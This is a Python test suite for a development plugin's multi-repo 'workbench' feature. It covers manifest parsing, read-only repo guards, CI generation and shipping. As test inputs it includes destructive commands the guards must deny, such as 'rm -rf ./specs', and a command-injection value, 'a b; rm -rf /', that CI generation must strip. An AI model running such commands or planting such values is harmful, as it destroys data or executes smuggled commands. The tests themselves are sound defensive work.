"""The workbench (one repo per app under a parent workbench repo) and the scope parsing it builds on.

Record: .sdlc/2026-11-13-l-workbench/change.md (AC-001 onward)."""
import json
import os
import sys
import unittest

from helpers import HOOKS, PLUGIN_ROOT, ProjectTestCase

sys.path.insert(0, HOOKS)
sys.path.insert(0, os.path.join(PLUGIN_ROOT, "scripts"))
import scaffold  # noqa: E402
import verify_freshness as vf  # noqa: E402

MONOREPO = {
    "commands": {"install": "pnpm install", "test": "pnpm -r test"},
    "packages": [
        {"name": "web", "path": "apps/web/", "stack": "node", "commands": {"test": "pnpm test", "lint": "pnpm lint"}},
        {"path": "./apps/api", "stack": "go", "commands": {"test": "go test ./..."}},
        {"name": "lib", "path": "packages/lib", "commands": {"test": "pnpm test"}},
    ],
}


class ScopeParsing(ProjectTestCase):
    def write_config(self, config):
        os.makedirs(self.path(".sdlc"), exist_ok=True)
        with open(self.path(".sdlc/config.json"), "w", encoding="utf-8") as f:
            json.dump(config, f)

    def test_one_scope_parser_for_scripts_and_hooks(self):
        self.write_config(MONOREPO)
        script = [(sc["name"], sc["path"]) for sc in scaffold.scopes(MONOREPO)]
        hook = [(sc["name"], sc["path"]) for sc in vf.load_scopes(self.root, None)[0]]
        self.assertEqual(script, hook)
        self.assertEqual(script, [("web", "apps/web"), ("apps/api", "apps/api"), ("lib", "packages/lib")])
        # A package without a name is still reported by the contract check
        os.makedirs(self.path("apps/web")), os.makedirs(self.path("apps/api")), os.makedirs(self.path("packages/lib"))
        out = scaffold.cmd_contract(scaffold.Project(self.root), None)
        self.assertIn("package without a name", out["scopes"]["apps/api"]["problems"])
        # Malformed packages are named, never guessed at or a traceback
        for bad, msg in (({"packages": [1]}, r"packages\[0\]"),({"packages": {"web": {}}}, "not a list")):
            with self.assertRaisesRegex(ValueError, msg):
                scaffold.scopes(bad)

    def test_root_test_beside_packages_runs_and_covers_every_package(self):
        self.write_config(MONOREPO)
        plan = scaffold.verify_plan(MONOREPO)
        root_steps = [(s["step"], s["cwd"], s["run"]) for s in plan["install"] + plan["verify"]
                      if s["scope"] == scaffold.ROOT_SCOPE]
        # Only the root test runs: other root commands (install here) keep not running, as before (H3)
        self.assertEqual(root_steps, [("test", ".", "pnpm -r test")])
        self.assertIn("pnpm -r test", scaffold.generate_ci(scaffold.Project(self.root)))
        # A package's own workflow leaves the root steps out
        self.assertNotIn("pnpm -r test", scaffold.generate_ci(scaffold.Project(self.root), "web"))
        scopes, root_tests = vf.load_scopes(self.root, None)
        self.assertEqual(vf.fresh_scopes("pnpm -r test", scopes, root_tests, self.root, self.root, True),
                         ["web", "apps/api", "lib"])

    def test_brownfield_reference_records_top_level_packages(self):
        path = os.path.join(PLUGIN_ROOT, "skills", "setting-up-projects", "references", "brownfield.md")
        with open(path, encoding="utf-8") as f:
            text = f.read()
        self.assertNotIn("→ `project` (`stack`, and `packages`", text)
        self.assertIn("top-level `packages`", text)


def git(cwd, *args):
    import subprocess
    subprocess.run(["git", "-c", "user.email=t@example.com", "-c", "user.name=t", *args], cwd=cwd, check=True,
                   capture_output=True)


class WorkbenchTestCase(ProjectTestCase):
    """A workbench at self.root: a git repo whose config says `"workbench": true`."""

    def setUp(self):
        super().setUp()
        git(self.root, "init", "-q")
        self.write_json(".sdlc/config.json", {"workbench": True})

    def write_json(self, rel, data):
        os.makedirs(os.path.dirname(self.path(rel)) or self.root, exist_ok=True)
        with open(self.path(rel), "w", encoding="utf-8") as f:
            json.dump(data, f)

    def origin(self, name, config=None):
        """A bare-able source repo outside the workbench to clone from; returns its file URL."""
        import tempfile
        src = os.path.realpath(tempfile.mkdtemp(prefix=f"sdlc-origin-{name}-"))
        self.addCleanup(__import__("shutil").rmtree, src, ignore_errors=True)
        git(src, "init", "-q")
        if config is not None:
            os.makedirs(os.path.join(src, ".sdlc"))
            with open(os.path.join(src, ".sdlc", "config.json"), "w", encoding="utf-8") as f:
                json.dump(config, f)
        with open(os.path.join(src, "README.md"), "w", encoding="utf-8") as f:
            f.write(name)
        git(src, "add", "-A")
        git(src, "commit", "-q", "-m", "init")
        return src

    def run_scaffold(self, *args):
        import subprocess
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "scaffold.py"), "--root", self.root,
                            *args], capture_output=True, encoding="utf-8", errors="replace")
        return p.returncode, (json.loads(p.stdout) if p.stdout.strip().startswith("{") else p.stdout), p.stderr

    def gitignore(self):
        try:
            with open(self.path(".gitignore"), encoding="utf-8", errors="surrogateescape") as f:
                return f.read().splitlines()
        except FileNotFoundError:
            return []


class WorkbenchManifest(WorkbenchTestCase):
    def test_workbench_scopes_and_detection(self):
        import sdlc_scopes
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True, "contract": {"provides": "v1"}},
            {"name": "web", "url": "u2", "role": "app", "write": True, "contract": {"consumes": "v1"}},
            {"name": "specs", "url": "u3", "role": "specs", "owner": "@org/ba"},
        ]})
        self.write_json("api/.sdlc/config.json", {"commands": {"test": "go test ./..."}, "project": {"stack": "go"}})
        self.assertTrue(sdlc_scopes.is_workbench(self.root))
        got = [(s["name"], s["path"], s["commands"].get("test")) for s in sdlc_scopes.workbench_scopes(self.root)]
        self.assertEqual(got, [("api", "api", "go test ./..."), ("web", "web", None),
                               (sdlc_scopes.WORKBENCH_SCOPE, ".", None)])
        # product-rebuild's repos.yaml alone, or no workbench key: not a workbench
        os.remove(self.path("workbench.json"))
        with open(self.path("repos.yaml"), "w", encoding="utf-8") as f:
            f.write("repos:\n  - name: api\n    path: ../api\n")
        self.assertFalse(sdlc_scopes.is_workbench(self.root))
        self.write_json(".sdlc/config.json", {"workbench": "yes"})
        self.write_json("workbench.json", {"repos": []})
        self.assertFalse(sdlc_scopes.is_workbench(self.root))
        # Malformed manifests are named, never a traceback
        self.write_json(".sdlc/config.json", {"workbench": True})
        for bad in ([], {"repos": None}, {"repos": [1]}, {"repos": [{"name": "api", "url": None, "role": "app"}]},
                    {"repos": [{"name": "api", "url": "u", "role": "boss"}]},
                    {"repos": [{"name": "api", "url": "u", "role": "specs", "write": True}]},
                    {"repos": [{"name": "api", "url": "u", "role": "app", "write": "yes"}]},
                    {"repos": [{"name": "a", "url": "u", "role": "app"}, {"name": "a", "url": "v", "role": "app"}]}):
            self.write_json("workbench.json", bad)
            with self.assertRaisesRegex(ValueError, "^not run: workbench.json"):
                sdlc_scopes.manifest(self.root)

    def test_workbench_add_and_remove(self):
        import sdlc_scopes
        url = self.origin("api", {"commands": {"test": "true"}})
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "api", "--role", "app", "--write",
                                           "--owner", "@org/backend")
        self.assertEqual(code, 0, (out, err))
        self.assertTrue(os.path.isfile(self.path("api/README.md")))
        self.assertIn("/api/", self.gitignore())
        [entry] = sdlc_scopes.manifest(self.root)
        self.assertEqual((entry["name"], entry["url"], entry["role"], entry["write"], entry["owner"]),
                         ("api", url, "app", True, "@org/backend"))
        # A read-only repo, named from its URL
        specs = self.origin("specs")
        code, out, err = self.run_scaffold("workbench", "add", specs, "--role", "specs")
        self.assertEqual(code, 0, (out, err))
        name = os.path.basename(specs)
        self.assertFalse(sdlc_scopes.manifest(self.root)[1]["write"])
        # remove: entry and gitignore line go, the folder stays
        code, out, err = self.run_scaffold("workbench", "remove", "api")
        self.assertEqual(code, 0, (out, err))
        self.assertEqual([r["name"] for r in sdlc_scopes.manifest(self.root)], [name])
        self.assertNotIn("/api/", self.gitignore())
        self.assertTrue(os.path.isdir(self.path("api")))
        # Names that aren't plain folder names are refused and nothing is written
        def snapshot():
            with open(self.path("workbench.json"), encoding="utf-8") as f:
                return f.read(), self.gitignore()
        before = snapshot()
        for bad in ("@org/web", "a/b", "..", "a\\b", ".git", ".sdlc", ".claude", "C:x", "-x", ""):
            code, out, err = self.run_scaffold("workbench", "add", url, f"--name={bad}", "--role", "app")
            self.assertNotEqual(code, 0, bad)
            self.assertIn("not a plain folder name", json.dumps(out) + err, bad)
        self.assertEqual(before, snapshot())
        self.assertFalse(os.path.exists(os.path.join(os.path.dirname(self.root), "web")))
        # Outside a workbench: refused
        self.write_json(".sdlc/config.json", {})
        code, out, err = self.run_scaffold("workbench", "add", url, "--name", "web", "--role", "app")
        self.assertNotEqual(code, 0)
        self.assertIn("not a workbench", json.dumps(out) + err)

    def test_doctor_reports_workbench_drift(self):
        import doctor
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "web", "url": "u2", "role": "app", "write": True},
            {"name": "specs", "url": "u3", "role": "specs"},
        ]})
        os.makedirs(self.path("api/.git")), os.makedirs(self.path("web/.git")), os.makedirs(self.path("stray/.git"))
        self.write_json("web/.sdlc/config.json", {"commands": {}})
        with open(self.path(".gitignore"), "w", encoding="utf-8") as f:
            f.write("/web/\nspecs\n")
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        rows = {c["check"]: c for c in r.checks}
        self.assertIn("specs", rows["workbench repos"]["detail"])  # listed, not cloned
        self.assertIn("stray", rows["workbench unlisted"]["detail"])
        self.assertIn("api", rows["workbench gitignore"]["detail"])
        self.assertNotIn("web", rows["workbench gitignore"]["detail"])
        self.assertIn("api", rows["workbench app setup"]["detail"])
        self.assertNotIn("web", rows["workbench app setup"]["detail"])
        # A malformed manifest is a failed row, not a crash; outside a workbench, no rows
        self.write_json("workbench.json", {"repos": [1]})
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        self.assertEqual([c["status"] for c in r.checks], ["fail"])
        self.write_json(".sdlc/config.json", {})
        r = doctor.Report()
        doctor.check_workbench(r, self.root)
        self.assertEqual(r.checks, [])


def block_rule(name, word, event="bash", field="command"):
    return (f"---\nname: {name}\nenabled: true\nevent: {event}\naction: block\nconditions:\n"
            f"  - field: {field}\n    operator: regex_match\n    pattern: {word}\n---\n{name} says no\n")


class WorkbenchGuardsCase(WorkbenchTestCase):
    """A session started in the workbench (which has its own .sdlc/): api/ is a writable app repo with its own
    guardrails, specs/ another team's read-only repo."""

    def setUp(self):
        super().setUp()
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "specs", "url": "u2", "role": "specs", "owner": "@org/ba"},
        ]})
        self.write_json("api/.sdlc/config.json", {"workbench": "shop-workbench", "commands": {}})
        self.write("api/.claude/hookify/no-x.md", block_rule("no-x", "forbidden"))
        self.write("api/.claude/hookify/no-secret.md", block_rule("no-secret", "SECRET", "file", "new_text"))
        self.write("specs/a.md", "spec\n")

    def pre(self, tool, cwd=None, **tool_input):
        from helpers import run_hook
        payload = {"hook_event_name": "PreToolUse", "tool_name": tool, "tool_input": tool_input,
                   "cwd": cwd or self.root}
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "pretooluse.py")], payload, self.root)
        self.assertEqual(code, 0, err)
        hso = (out or {}).get("hookSpecificOutput", {})
        return hso.get("permissionDecisionReason", "") if hso.get("permissionDecision") == "deny" else None

    def guard(self, path, agent):
        from helpers import run_hook
        payload = {"hook_event_name": "PreToolUse", "cwd": self.root, "tool_name": "Write",
                   "tool_input": {"file_path": path}, "agent_type": agent}
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "role_guard.py")], payload, self.root)
        self.assertEqual(code, 0, err)
        return (out or {}).get("hookSpecificOutput", {}).get("permissionDecision")



class WorkbenchGuards(WorkbenchGuardsCase):
    def test_guards_route_into_an_app_repo_from_a_workbench(self):
        api = self.path("api")
        self.assertIn("no-x", self.pre("Bash", command="cd api && echo forbidden") or "")
        self.assertIn("no-x", self.pre("Bash", cwd=api, command="echo forbidden") or "")
        self.assertIn("no-secret", self.pre("Write", file_path=self.path("api/src/a.ts"), content="SECRET=1") or "")
        self.assertIsNone(self.pre("Write", file_path=self.path("docs/a.md"), content="SECRET=1"))
        # The role guard judges api's files against api, and the workbench's own findings folder stays open
        self.assertEqual(self.guard(self.path("api/src/a.ts"), "sdlc:code-reviewer"), "deny")
        self.assertIsNone(self.guard(self.path(".sdlc/.work/findings/f/r.md"), "sdlc:code-reviewer"))
        # A repo that isn't a workbench (no key, or the key without a manifest) behaves as before
        for config, manifest in (({}, True), ({"workbench": True}, False), ({"workbench": "yes"}, True)):
            self.write_json(".sdlc/config.json", config)
            if not manifest:
                os.remove(self.path("workbench.json"))
            self.assertIsNone(self.pre("Bash", command="cd api && echo forbidden"), config)
            self.assertIsNone(self.pre("Write", file_path=self.path("api/src/a.ts"), content="SECRET=1"), config)

    def test_writes_into_a_read_only_repo_are_denied(self):
        specs = self.path("specs")
        denied = [("Write", {"file_path": self.path("specs/b.md"), "content": "x"}),
                  ("Edit", {"file_path": "specs/a.md", "old_string": "spec", "new_string": "x"}),
                  ("Write", {"file_path": self.path("specs/deep/c.md"), "content": "x"}),
                  ("Bash", {"command": "echo hi > specs/a.md"}),
                  ("Bash", {"command": "cd specs && rm a.md"}),
                  ("Bash", {"command": "sed -i s/a/b/ specs/a.md"}),
                  ("Bash", {"command": "cp README.md specs/"}),
                  ("Bash", {"command": "mv specs/a.md ."}),
                  ("Bash", {"command": "touch specs/new.md"}),
                  ("Bash", {"command": "bash -c 'mkdir specs/x'"}),
                  ("Bash", {"command": f"git -C {specs} commit -am x"}),
                  ("Bash", {"command": "cd specs && git push origin main"}),
                  ("Bash", {"command": "rm -rf ./specs"}),
                  ("PowerShell", {"command": "Set-Content specs\\a.md x"})]
        if os.path.normcase("A") == "a" or sys.platform == "darwin":
            denied.append(("Write", {"file_path": self.path("SPECS/b.md"), "content": "x"}))
        for tool, tin in denied:
            reason = self.pre(tool, **tin)
            self.assertIsNotNone(reason, (tool, tin))
            self.assertIn("specs", reason)
            self.assertIn("@org/ba", reason)
        # Writes from inside the repo, and through a link to it
        self.assertIsNotNone(self.pre("Bash", cwd=specs, command="echo x > b.md"))
        os.symlink(specs, self.path("s2"))
        self.assertIsNotNone(self.pre("Write", file_path=self.path("s2/b.md"), content="x"))
        # Reads, and writes elsewhere, stay open
        for tool, tin in [("Bash", {"command": "cat specs/a.md"}), ("Bash", {"command": f"git -C {specs} log"}),
                          ("Bash", {"command": "cd specs && git pull"}),
                          ("Bash", {"command": "cp specs/a.md docs/a.md"}),
                          ("Write", {"file_path": self.path("api/a.ts"), "content": "x"}),
                          ("Write", {"file_path": self.path("specsx/a.md"), "content": "x"})]:
            self.assertIsNone(self.pre(tool, **tin), (tool, tin))
        # Not a workbench: no read-only repos
        self.write_json(".sdlc/config.json", {})
        self.assertIsNone(self.pre("Write", file_path=self.path("specs/b.md"), content="x"))

    def test_no_feature_starts_in_an_app_repo(self):
        import subprocess
        def new(root):
            p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "state.py"), "--root", root,
                                "new", "feat", "--track", "S", "--risk", "low", "--task", "x | AC-001 | a.py"],
                               capture_output=True, encoding="utf-8", errors="replace")
            return p.returncode, p.stdout
        api = self.path("api")
        before = sorted(os.listdir(os.path.join(api, ".sdlc")))
        code, out = new(api)
        self.assertEqual(code, 1, out)
        self.assertIn("shop-workbench", out)
        self.assertIn(self.root, json.loads(out)["error"])
        self.assertEqual(sorted(os.listdir(os.path.join(api, ".sdlc"))), before)
        # The workbench itself starts features
        code, out = new(self.root)
        self.assertEqual(code, 0, out)


def git_out(cwd, *args):
    import subprocess
    return subprocess.run(["git", *args], cwd=cwd, capture_output=True, encoding="utf-8",
                          errors="replace").stdout.strip()


CHECK = "import os, sys; sys.exit(1 if os.path.exists('broken') else 0)\n"


class WorkbenchFeatureCase(WorkbenchTestCase):
    """A workbench on branch feat-x with a feature `feat`; api/ and web/ are writable app repos on main, specs/ a
    read-only repo."""

    def setUp(self):
        super().setUp()
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True},
            {"name": "web", "url": "u2", "role": "app", "write": True},
            {"name": "specs", "url": "u3", "role": "specs"},
        ]})
        self.write(".gitignore", "/api/\n/web/\n/specs/\n")
        git(self.root, "add", "-A")
        git(self.root, "commit", "-q", "-m", "workbench")
        git(self.root, "checkout", "-q", "-b", "feat-x")
        for name in ("api", "web", "specs"):
            d = self.path(name)
            git(self.root, "init", "-q", "-b", "main", name)
            if name != "specs":
                self.write_json(f"{name}/.sdlc/config.json",
                                {"workbench": "shop-workbench", "commands": {"test": "python3 check.py"}})
                self.write(f"{name}/check.py", CHECK)
                self.write(f"{name}/.gitignore", ".sdlc/.work/\n")
            self.write(f"{name}/README.md", name)
            git(d, "add", "-A")
            git(d, "commit", "-q", "-m", "init")
        code, out = self.state("new", "feat", "--track", "M", "--risk", "low", "--task", "x | AC-001 | api/a.py")
        self.assertEqual(code, 0, out)

    def state(self, *args):
        import subprocess
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "state.py"), "--root", self.root,
                            *args], capture_output=True, encoding="utf-8", errors="replace")
        return p.returncode, p.stdout

    def state_text(self):
        with open(self.path(".sdlc/feat/state.md"), encoding="utf-8") as f:
            return f.read()



class WorkbenchFeature(WorkbenchFeatureCase):
    def test_build_branches_and_verifies_each_touched_repo(self):
        import sdlc_scopes
        import verify
        api_main = git_out(self.path("api"), "rev-parse", "HEAD")
        code, out = self.state("repo", "feat", "api")
        self.assertEqual(code, 0, out)
        self.assertEqual(git_out(self.path("api"), "rev-parse", "--abbrev-ref", "HEAD"), "feat-x")
        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["api"],
                         {"branch": "feat-x", "base": api_main})
        # Again: already recorded, nothing changes
        before = self.state_text()
        self.assertEqual(self.state("repo", "feat", "api")[0], 0)
        self.assertEqual(self.state_text(), before)
        # A dirty repo is refused, naming it; no branch, nothing recorded
        self.write("web/wip.txt", "x")
        code, out = self.state("repo", "feat", "web")
        self.assertEqual(code, 1, out)
        self.assertIn("web", json.loads(out)["error"])
        self.assertIn("uncommitted", json.loads(out)["error"])
        self.assertEqual(git_out(self.path("web"), "rev-parse", "--abbrev-ref", "HEAD"), "main")
        self.assertNotIn("web", sdlc_scopes.feature_repos(self.state_text()))
        # A read-only repo records the commit read; an unlisted name or a bad one is refused
        code, out = self.state("repo", "feat", "specs")
        self.assertEqual(code, 0, out)
        self.assertEqual(sdlc_scopes.feature_repos(self.state_text())["specs"],
                         {"read": git_out(self.path("specs"), "rev-parse", "HEAD")})
        for bad in ("nope", "../x", ".sdlc"):
            self.assertEqual(self.state("repo", "feat", bad)[0], 1, bad)
        # verify runs each touched repo's plan in its folder; a failure names the repo
        self.assertEqual(verify.repo_failures(self.root, "feat", 60), [])
        self.write("api/broken", "")
        failures = verify.repo_failures(self.root, "feat", 60)
        self.assertEqual(len(failures), 1, failures)
        self.assertTrue(failures[0].startswith("api: "), failures)

    def hook(self, event, tool=None, cwd=None, **tool_input):
        from helpers import run_hook
        payload = {"hook_event_name": event, "cwd": cwd or self.root}
        if tool:
            payload.update(tool_name=tool, tool_input=tool_input, tool_response={})
        code, out, raw, err = run_hook(["python3", os.path.join(HOOKS, "verify_freshness.py")], payload, self.root)
        self.assertEqual(code, 0, err)
        self.assertFalse(os.path.exists(self.path(".sdlc/.work/verify-freshness.error")),
                         open(self.path(".sdlc/.work/verify-freshness.error")).read()
                         if os.path.exists(self.path(".sdlc/.work/verify-freshness.error")) else "")
        return out

    def scopes(self):
        with open(self.path(".sdlc/.work/verify-freshness.json"), encoding="utf-8") as f:
            return json.load(f)["scopes"]

    def test_freshness_is_per_app_repo(self):
        for name in ("api", "web"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
            self.write(f"{name}/a.py", "x = 1\n")
        self.assertEqual(self.state("advance", "feat", "3")[0], 0)
        self.hook("PostToolUse", "Edit", file_path=self.path("api/a.py"))
        st = self.scopes()
        self.assertTrue(st["api"]["stale"])
        self.assertIn("api/a.py", st["api"]["reason"])
        self.assertNotIn("api/a.py", st["web"].get("reason", ""))
        # A full test run in api/ makes only api fresh
        self.hook("PostToolUse", "Bash", command="cd api && python3 check.py")
        st = self.scopes()
        self.assertFalse(st["api"]["stale"])
        self.assertTrue(st["web"]["stale"])
        out = self.hook("Stop")
        self.assertIn("web:", out["reason"])
        self.assertNotIn("api:", out["reason"])
        # A change in api/ that no edit tool made is seen at the next stop, in api only
        self.write("api/a.py", "x = 2\n")
        out = self.hook("Stop")
        self.assertIn("api: api/a.py", out["reason"])
        # web's own run clears web, from its folder only
        self.hook("PostToolUse", "Bash", command="python3 check.py", cwd=self.path("web"))
        self.assertFalse(self.scopes()["web"]["stale"])

    def test_moved_read_only_repo_is_reported(self):
        import subprocess
        specs = self.path("specs")
        self.write("specs/b.md", "b")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "b")
        recorded = git_out(specs, "rev-parse", "HEAD")
        self.assertEqual(self.state("repo", "feat", "specs")[0], 0)

        def stats():
            p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "diff_stats.py"), "--root",
                                self.root, "--plan", self.path(".sdlc/feat/state.md")], capture_output=True,
                               encoding="utf-8", errors="replace")
            self.assertEqual(p.returncode, 0, p.stdout + p.stderr)
            return json.loads(p.stdout)
        self.assertEqual(stats()["read_only"], [])
        self.write("specs/c.md", "c")
        git(specs, "add", "-A")
        git(specs, "commit", "-q", "-m", "c")
        current = git_out(specs, "rev-parse", "HEAD")
        r = stats()
        self.assertEqual(r["read_only"], [{"repo": "specs", "recorded": recorded, "current": current,
                                           "files": ["c.md"], "gone": False}])
        self.assertTrue(any("specs" in f and "moved" in f for f in r["flags"]), r["flags"])
        # Force-pushed: the recorded commit is gone
        git(specs, "reset", "-q", "--hard", "HEAD~2")
        git(specs, "reflog", "expire", "--expire=now", "--all")
        git(specs, "gc", "-q", "--prune=now")
        [moved] = stats()["read_only"]
        self.assertTrue(moved["gone"], moved)
        self.assertTrue(any("no longer exists" in f for f in stats()["flags"]))


class WorkbenchCI(WorkbenchTestCase):
    def test_app_ci_checks_out_the_workbench(self):
        self.write_json(".sdlc/config.json", {"workbench": True,
                                              "api_contract": {"path": "contract", "spec": "openapi.yaml"}})
        self.write_json("workbench.json", {"repos": [
            {"name": "api", "url": "u1", "role": "app", "write": True, "contract": {"provides": "v1"}},
            {"name": "web", "url": "u2", "role": "app", "write": True, "contract": {"consumes": "v1"}},
        ]})
        for name in ("api", "web"):
            self.write_json(f"{name}/.sdlc/config.json", {"workbench": "shop-workbench", "project": {"stack": "node"},
                                                          "commands": {"install": "pnpm install",
                                                                       "test": "pnpm test"}})
        ci = scaffold.generate_ci(scaffold.Project(self.path("web")))
        self.assertIn("repository: ${{ github.repository_owner }}/shop-workbench", ci)
        self.assertIn("github.head_ref || github.ref_name", ci)
        self.assertIn("ref=main", ci)
        self.assertIn("../contract", ci)
        # The token isn't left in the checkout, and the checkout leaves the app's tree before its own steps (S5, L4)
        self.assertIn("persist-credentials: false", ci)
        self.assertIn("&& rm -rf .workbench", ci)
        # Before the install step, and the branch reaches the script only through env, never inlined
        self.assertLess(ci.index("shop-workbench"), ci.index("pnpm install"))
        self.assertNotIn("${{ github.head_ref }}\n", ci.split("run: |", 1)[1].split("env:")[0])
        # An owner/name back-reference is used as is
        self.write_json("web/.sdlc/config.json", {"workbench": "acme/shop-workbench",
                                                  "commands": {"test": "pnpm test"}})
        self.assertIn("repository: acme/shop-workbench", scaffold.generate_ci(scaffold.Project(self.path("web"))))
        # The provider, a repo outside a workbench, and a bad back-reference get no workbench checkout
        self.assertNotIn("shop-workbench", scaffold.generate_ci(scaffold.Project(self.path("api"))))
        self.write_json("web/.sdlc/config.json", {"workbench": "a b; rm -rf /", "commands": {"test": "pnpm test"}})
        self.assertNotIn("rm -rf", scaffold.generate_ci(scaffold.Project(self.path("web"))))
        # The workbench's contract check reads api_contract.path unchanged
        self.assertIn('"origin/${{ github.base_ref }}" contract openapi.yaml',
                      scaffold.generate_contract_check(scaffold.Project(self.root)))


def read_doc(*parts):
    with open(os.path.join(PLUGIN_ROOT, *parts), encoding="utf-8") as f:
        return f.read()


class WorkbenchDocs(unittest.TestCase):
    def test_setup_and_docs_describe_the_workbench(self):
        refs = ("skills", "setting-up-projects", "references")
        greenfield = read_doc(*refs, "greenfield.md")
        # Two or more apps: setup asks, offering both layouts as equals (the monorepo is never only "on request")
        route = next(line for line in greenfield.splitlines() if "Two or more apps" in line)
        for needed in ("workbench.md", "monorepo.md", "ask", "one team"):
            self.assertIn(needed, route, needed)
        self.assertNotIn("on request", route)
        self.assertNotIn("only when the user asks", route)
        workbench = read_doc(*refs, "workbench.md")
        for needed in ("workbench.json", '"workbench": true', "scaffold.py\" workbench add", "state.py",
                       " repo ", "ship.py", "--status", "WORKBENCH_TOKEN", "contract/v1/openapi.yaml",
                       "write", "0025"):
            self.assertIn(needed, workbench, needed)
        self.assertIn("workbench.md", read_doc("skills", "setting-up-projects", "SKILL.md"))
        monorepo = read_doc(*refs, "monorepo.md")
        self.assertIn("0025", monorepo)
        self.assertNotIn("Only when the user asks", monorepo)
        self.assertNotIn("supersed", read_doc("skills", "setting-up-projects", "SKILL.md").lower())
        adr = read_doc("docs", "adr", "0025-workbench-for-multi-app-projects.md")
        self.assertIn("Extends [ADR 0005]", adr)
        self.assertNotIn("Supersedes", adr)
        index = read_doc("docs", "adr", "README.md")
        self.assertIn("0025", index)
        row = next(line for line in index.splitlines() if line.startswith("| [0005]"))
        self.assertNotIn("superseded", row.lower())
        adr5 = read_doc("docs", "adr", "0005-greenfield-monorepo-layout.md")
        self.assertIn("[ADR 0025]", adr5)
        self.assertNotIn("Superseded", adr5)
        for page in ("Project-setup.md", "Configuration.md", "Where-things-live.md"):
            self.assertIn("workbench", read_doc("docs", "wiki", page).lower(), page)
        self.assertIn("workbench.json", read_doc("docs", "wiki", "Where-things-live.md"))
        self.assertIn("Workbench", read_doc("CHANGELOG.md").split("## 3.7.0")[0])


class PreferredStacks(unittest.TestCase):
    def test_greenfield_proposes_the_preferred_stacks(self):
        refs = ("skills", "setting-up-projects", "references")
        self.assertIn("stacks.md", read_doc(*refs, "greenfield.md").split("## `skeleton`")[0])
        self.assertIn("stacks.md", read_doc(*refs, "workbench.md").split("## `skeleton`")[0])
        stacks = read_doc(*refs, "stacks.md")
        sections = {s.split("\n", 1)[0].strip(): s for s in stacks.split("\n## ")[1:]}
        expected = {
            "Nuxt": ["SPA", "ssr: false", "Nuxt UI", "Pinia", "Pinia Colada", "Zod", "pnpm create nuxt"],
            "React": ["Vite", "shadcn/ui", "Zustand", "TanStack Query", "React Router", "Zod",
                      "pnpm create vite"],
            "Node": ["Hono", "PostgreSQL", "Drizzle", "Zod", "Cloud Run", "Cloud SQL", "Cloudflare Workers", "Neon",
                     "pnpm create hono"],
            "Go": ["Gin", "oapi-codegen", "pgx/v5", "sqlc", "golang-migrate", "Cloud Run", "Cloud SQL",
                   "go mod init"],
        }
        for stack, pieces in expected.items():
            section = next((v for k, v in sections.items() if k.startswith(stack)), None)
            self.assertIsNotNone(section, stack)
            for piece in pieces:
                self.assertIn(piece, section, (stack, piece))
            for command in ("install", "test", "lint", "typecheck", "build"):
                self.assertRegex(section, rf"\|\s*`?{command}`?\s*\|", (stack, command))


class WorkbenchShipCase(WorkbenchFeatureCase):
    CHANGE = "# Shop checkout\n\n## Acceptance criteria\n\n## Acceptance tests\n\n| AC | Test | Run |\n|---|---|---|\n"

    def setUp(self):
        super().setUp()
        self.write_json("workbench.json", {"repos": [
            {"name": "web", "url": "https://example.com/web.git", "role": "app", "write": True,
             "contract": {"consumes": "v1"}},
            {"name": "api", "url": "https://example.com/api.git", "role": "app", "write": True,
             "contract": {"provides": "v1"}},
            {"name": "specs", "url": "u3", "role": "specs"},
        ]})
        self.write(".sdlc/feat/change.md", self.CHANGE)

    def ship(self, *extra, env=None):
        import subprocess
        p = subprocess.run([sys.executable, os.path.join(PLUGIN_ROOT, "scripts", "ship.py"), "--root", self.root,
                            "feat", *extra], capture_output=True, encoding="utf-8", errors="replace",
                           env={**os.environ, **(env or {})})
        return p.returncode, p.stdout + p.stderr



class WorkbenchShip(WorkbenchShipCase):
    def test_ship_commits_each_repo_in_merge_order(self):
        import verify
        for name in ("web", "api"):
            self.assertEqual(self.state("repo", "feat", name)[0], 0)
        self.write("api/a.py", "x = 1\n")
        self.write("web/b.py", "y = 1\n")
        self.state("deviation", "feat", "workbench.json web/b.py What: contract roles. Why: test. Effect: none.")
        # A passing verify covers the app repos too: a later change in one is unverified
        last, notes = verify.full(self.root, "feat", 60, whole=True)
        self.assertEqual(last["result"], "pass", last["failures"] + notes)
        self.assertTrue(verify.status(self.root, "feat")["reuse"])
        self.write("api/c.py", "z = 1\n")
        st = verify.status(self.root, "feat")
        self.assertFalse(st["reuse"])
        self.assertIn("api", st["reason"])
        os.remove(self.path("api/c.py"))
        # A file in an app repo that no task names is drift
        self.write("web/stray.py", "s = 1\n")
        last, _ = verify.full(self.root, "feat", 60, whole=True)
        self.assertTrue(any("web/stray.py" in f for f in last["failures"]), last["failures"])
        os.remove(self.path("web/stray.py"))

        code, out = self.ship("--review", "No review ran: test.")
        self.assertEqual(code, 0, out)
        result = json.loads(out)
        repos = result["repos"]
        self.assertEqual([r["name"] for r in repos], ["(workbench)", "api", "web"])
        for r in repos[1:]:
            self.assertIn(r["path"], (self.path("api"), self.path("web")))
            self.assertEqual(git_out(r["path"], "branch", "--show-current"), "feat-x")
            self.assertTrue(r["staged"], r)
            git(r["path"], "commit", "-q", "-F", r["message"])
            msg = git_out(r["path"], "log", "-1", "--format=%B")
            self.assertIn("Shop checkout", msg)
            self.assertIn(".sdlc/feat/change.md", msg)
        self.assertIn("workbench.json", repos[0]["staged"])
        with open(repos[1]["pr_body"], encoding="utf-8") as f:
            body = f.read()
        self.assertIn("https://example.com/web.git", body)
        self.assertIn("(workbench)", body)
